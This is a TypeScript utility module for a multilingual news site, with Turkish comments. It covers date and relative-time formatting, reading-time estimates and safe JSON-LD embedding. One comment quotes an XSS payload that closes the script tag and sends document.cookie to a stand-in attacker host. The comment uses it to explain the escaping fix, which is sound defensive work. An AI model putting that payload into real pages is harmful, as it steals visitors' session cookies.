import { localeTags, type Locale } from "@/i18n/config";

/** {n} gibi yer tutucuları doldurur */
export function t(
  template: string,
  vars: Record<string, string | number> = {},
): string {
  return template.replace(/\{(\w+)\}/g, (_, k) =>
    k in vars ? String(vars[k]) : `{${k}}`,
  );
}

export function formatDate(iso: string | null | undefined, locale: Locale, withTime = true) {
  /*
   * ⚠ GEÇERSİZ TARİHTE BOŞ DÖNÜYOR.
   * Korumasızken ekrana "Invalid Date" yazıyordu. Çökertmiyor
   * ama okura anlamsız; `relativeTime` ile aynı davranış.
   */
  if (!iso) return "";
  const d = new Date(iso);
  if (!Number.isFinite(d.getTime())) return "";
  return new Intl.DateTimeFormat(localeTags[locale], {
    day: "numeric",
    month: "short",
    year: d.getFullYear() === new Date().getFullYear() ? undefined : "numeric",
    ...(withTime ? { hour: "2-digit", minute: "2-digit" } : {}),
    timeZone: "Europe/Istanbul",
  }).format(d);
}

/**
 * Tam sayısal tarih: 20.05.2026
 *
 * Göreli zaman ("3 saat önce") okunur ama belirsizdir; arşiv
 * haberlerinde okur kesin tarihi arar. İkisi birlikte gösteriliyor.
 */
export function fullDate(iso: string, locale: Locale) {
  return new Intl.DateTimeFormat(localeTags[locale], {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    timeZone: "Europe/Istanbul",
  }).format(new Date(iso));
}

export function formatTime(iso: string, locale: Locale) {
  return new Intl.DateTimeFormat(localeTags[locale], {
    hour: "2-digit",
    minute: "2-digit",
    timeZone: "Europe/Istanbul",
  }).format(new Date(iso));
}

/** "3 dk önce" — listelerde tarihten daha okunur */
/**
 * "3 dakika önce", "2 gün önce", "1 hafta önce"…
 *
 * ┌─ `numeric: "auto"` KULLANILMIYOR ⚠️ ──────────────────────┐
 * │ Tarayıcının kendi çevirisi Türkçede tuhaf sonuçlar         │
 * │ veriyordu: 0 dakika için "bu dakika", 1 gün için "dün".    │
 * │ Haber sitesinde "bu dakika" diye bir zaman ifadesi yok.    │
 * │                                                              │
 * │ `numeric: "always"` her zaman sayı veriyor ("0 dakika       │
 * │ önce"), o da doğal değil. Bu yüzden eşikler elle            │
 * │ yazılıyor.                                                   │
 * └──────────────────────────────────────────────────────────────┘
 *
 * ⚠ Bir haftadan eskisi göreli değil, TARİH gösteriyor:
 * "37 hafta önce" kimseye bir şey ifade etmiyor.
 */
export function relativeTime(iso: string | null | undefined, locale: Locale): string {
  /*
   * ┌─ GEÇERSİZ TARİH SAYFAYI ÇÖKERTİYORDU ⚠️ ──────────────────┐
   * │ `published_at` boş ya da bozuksa `new Date(...)` NaN       │
   * │ üretiyor. NaN hiçbir karşılaştırmaya takılmıyor            │
   * │ (`NaN < 0` da `NaN < 45` de false), akış en sona kadar     │
   * │ iniyor ve `Intl.RelativeTimeFormat.format(NaN)` çağrılıyor.│
   * │                                                              │
   * │ O metot sonlu olmayan değerde RangeError FIRLATIYOR. Bu    │
   * │ bir istemci bileşeninde olduğu için tüm sayfa çöküyordu:   │
   * │   "Application error: a client-side exception has occurred"│
   * │                                                              │
   * │ Yazar sayfasında haberlerin tarihi dolu olduğu için sorun  │
   * │ görünmüyordu; kaynak (IHA) haberlerinde tarih boş          │
   * │ olabildiğinden yalnızca yayıncı sayfası patlıyordu.        │
   * └──────────────────────────────────────────────────────────────┘
   */
  if (!iso) return "";

  const zaman = new Date(iso).getTime();
  if (!Number.isFinite(zaman)) return "";

  const diff = Date.now() - zaman;
  const sn = Math.round(diff / 1000);

  /* Gelecek tarih (zamanlanmış haber) — göreli anlamsız */
  if (sn < 0) return formatDate(iso, locale, false);

  const rtf = new Intl.RelativeTimeFormat(localeTags[locale], {
    numeric: "always",
  });

  if (sn < 45) {
    /* "0 saniye önce" yerine düz bir ifade */
    return locale === "tr" ? "şimdi"
      : locale === "en" ? "just now"
      : locale === "ar" ? "الآن"
      : "только что";
  }
  if (sn < 3600) return rtf.format(-Math.round(sn / 60), "minute");

  const saat = Math.round(sn / 3600);
  if (saat < 24) return rtf.format(-saat, "hour");

  const gun = Math.round(sn / 86400);
  if (gun < 7) return rtf.format(-gun, "day");

  const hafta = Math.round(gun / 7);
  if (hafta < 5) return rtf.format(-hafta, "week");

  /* Bir aydan eskisi tarih olarak — göreli ifade anlamsızlaşıyor */
  return formatDate(iso, locale, false);
}

/**
 * "2 Eylül 2026 11:55"
 *
 * Künyede iki ayrı tarih gösteriliyordu (biri `02.09.2026`,
 * diğeri `2 Eyl 11:56`); aynı bilgi iki kez ve iki farklı
 * biçimde. Tek satır, okunaklı biçim.
 */
export function tamTarih(iso: string, locale: Locale): string {
  return new Intl.DateTimeFormat(localeTags[locale], {
    day: "numeric", month: "long", year: "numeric",
    hour: "2-digit", minute: "2-digit",
  }).format(new Date(iso));
}

export function formatNumber(n: number, locale: Locale, digits = 2) {
  return new Intl.NumberFormat(localeTags[locale], {
    minimumFractionDigits: digits,
    maximumFractionDigits: digits,
  }).format(n);
}

export function compactNumber(n: number, locale: Locale) {
  return new Intl.NumberFormat(localeTags[locale], {
    notation: "compact",
    maximumFractionDigits: 1,
  }).format(n);
}

/**
 * Okuma süresi (metinden).
 * Türkçe için dakikada ~200 kelime; en az 1 dakika.
 */
export function readingMinutes(text: string | null | undefined): number {
  if (!text) return 1;
  const words = text.trim().split(/\s+/).length;
  return Math.max(1, Math.round(words / 200));
}

/**
 * Bir haberin okuma süresi.
 *
 * ÖNCE veritabanındaki `reading_minutes` kolonu okunur — o değer
 * haberin TAM GÖVDESİNDEN hesaplanır. Liste kartları gövdeyi
 * indirmediği için buradan hesaplamaya çalışmak her habere
 * "1 dakika" yazdırıyordu; hatanın sebebi buydu.
 */
export function articleMinutes(a: {
  reading_minutes?: number | null;
  summary?: string | null;
  body?: unknown;
}): number {
  if (a.reading_minutes && a.reading_minutes > 0) return a.reading_minutes;
  const text = plainText(a.body, a.summary ?? null);
  return readingMinutes(text || a.summary);
}

export function plainText(
  body: unknown,
  fallback: string | null = null,
): string {
  if (typeof body === "string") return body;
  if (Array.isArray(body)) {
    return body
      .map((b) =>
        b && typeof b === "object" && "text" in b ? String(b.text) : "",
      )
      .filter(Boolean)
      .join(" ");
  }
  return fallback ?? "";
}

/**
 * JSON-LD'yi `<script>` etiketinin içine güvenle gömer.
 *
 * ┌─ SAKLI XSS ⚠️ ─────────────────────────────────────────────┐
 * │ `JSON.stringify` tırnakları kaçırıyor ama `<` ve `/`       │
 * │ karakterlerine dokunmuyor. Haber başlığı şunu içerirse:    │
 * │                                                              │
 * │   </script><script>fetch('//saldirgan/'+document.cookie)   │
 * │                                                              │
 * │ tarayıcı script etiketini ERKEN KAPATIYOR ve saldırganın   │
 * │ kodunu çalıştırıyor. Başlığı yazarlar giriyor — yani bir   │
 * │ yazar hesabı, siteyi gezen HERKESTE (yöneticiler dahil)    │
 * │ kod çalıştırabilir ve oturum çerezlerini çalabilirdi.      │
 * │                                                              │
 * │ Çözüm: tehlikeli karakterler Unicode kaçışına çevriliyor.  │
 * │ JSON olarak anlamı aynı kalıyor — `JSON.parse` ikisini de  │
 * │ aynı okuyor — ama HTML çözümleyici artık etiket sonu       │
 * │ görmüyor.                                                    │
 * └──────────────────────────────────────────────────────────────┘
 */
export function guvenliJsonLd(veri: unknown): string {
  return JSON.stringify(veri)
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026")
    /* U+2028/2029 bazı çözümleyicilerde satır sonu sayılıyor */
    .replace(/\u2028/g, "\\u2028")
    .replace(/\u2029/g, "\\u2029");
}
